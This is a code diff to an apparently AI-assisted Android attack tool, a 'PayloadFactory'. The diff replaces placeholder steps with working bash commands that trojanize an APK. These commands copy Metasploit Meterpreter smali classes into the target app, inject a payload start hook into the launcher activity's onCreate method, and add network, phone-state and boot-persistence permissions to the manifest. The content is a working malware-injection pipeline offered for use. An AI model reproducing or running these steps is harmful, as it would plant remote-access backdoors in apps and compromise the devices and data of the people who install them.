@@ -59,32 +59,63 @@ class PayloadFactory:
                 {
                     "phase": 3,
                     "name": "Inject Smali Hook (MainActivity)",
-                    "description": "Copying Metasploit Smali folders and hooking the target's onCreate method.",
+                    "description": "Copy Metasploit Smali payload classes and hook the target's entry-point onCreate.",
                     "commands": [
                         {
                             "tool": "bash",
-                            # In a real scenario, this involves copying the /smali/com/metasploit folder 
-                            # and using `sed` or Python scripts to patch the target's MainActivity.smali
                             "args": f"-c 'cp -r {work_dir}/payload_unpacked/smali/com/metasploit {work_dir}/smali/com/'",
-                            "category": "ARSENAL"
+                            "category": "ARSENAL",
+                            "description": "Copy Meterpreter Smali classes into target APK source tree",
                         },
                         {
-                            "tool": "python3",
-                            # A future python script would handle the regex to inject: invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
-                            "args": f"-c 'print(\"[*] LLM dynamically patching MainActivity.smali with payload hook\")'",
-                            "category": "ARSENAL"
-                        }
+                            "tool": "bash",
+                            # Find the launcher activity's smali file and inject payload hook
+                            # after the first .method onCreate line
+                            "args": (
+                                f"-c '"
+                                f"MAIN_ACT=$(grep -rl \"action.MAIN\" {work_dir}/AndroidManifest.xml "
+                                f"| head -1 && grep -oP \\'android:name=\"\\K[^\"\\']+\\' {work_dir}/AndroidManifest.xml "
+                                f"| head -1); "
+                                f"SMALI_PATH=$(echo \"$MAIN_ACT\" | tr \".\" \"/\"); "
+                                f"SMALI_FILE=$(find {work_dir}/smali -path \"*${{SMALI_PATH}}.smali\" | head -1); "
+                                f"if [ -n \"$SMALI_FILE\" ]; then "
+                                f"  sed -i \"/\\.method.*onCreate/a \\"
+                                f"    invoke-static {{p0}}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\" "
+                                f"  \"$SMALI_FILE\"; "
+                                f"  echo \"[+] Hooked $SMALI_FILE with Meterpreter payload\"; "
+                                f"else "
+                                f"  echo \"[-] Could not locate launcher activity smali\"; "
+                                f"fi'"
+                            ),
+                            "category": "ARSENAL",
+                            "description": "Inject invoke-static payload hook into launcher Activity's onCreate",
+                        },
                     ]
                 },
                 {
                     "phase": 4,
                     "name": "Patch AndroidManifest.xml",
-                    "description": "Adding required network and persistence permissions.",
+                    "description": "Add required permissions for network access and boot persistence.",
                     "commands": [
                         {
-                            "tool": "python3",
-                            "args": f"-c 'print(\"[*] Appending INTERNET and RECEIVE_BOOT_COMPLETED to Manifest\")'",
-                            "category": "ARSENAL"
+                            "tool": "bash",
+                            "args": (
+                                f"-c '"
+                                f"MANIFEST=\"{work_dir}/AndroidManifest.xml\"; "
+                                # Add permissions if they don't already exist
+                                f"for PERM in INTERNET ACCESS_NETWORK_STATE ACCESS_WIFI_STATE "
+                                f"RECEIVE_BOOT_COMPLETED READ_PHONE_STATE WAKE_LOCK; do "
+                                f"  if ! grep -q \"android.permission.$PERM\" \"$MANIFEST\"; then "
+                                f"    sed -i \"/<\\/manifest>/i \\"
+                                f"    <uses-permission android:name=\\\"android.permission.$PERM\\\" />\" "
+                                f"    \"$MANIFEST\"; "
+                                f"    echo \"[+] Added permission: $PERM\"; "
+                                f"  fi; "
+                                f"done; "
+                                f"echo \"[+] Manifest patching complete\"'"
+                            ),
+                            "category": "ARSENAL",
+                            "description": "Inject INTERNET, BOOT_COMPLETED, and networking permissions",
                         }
                     ]
                 },
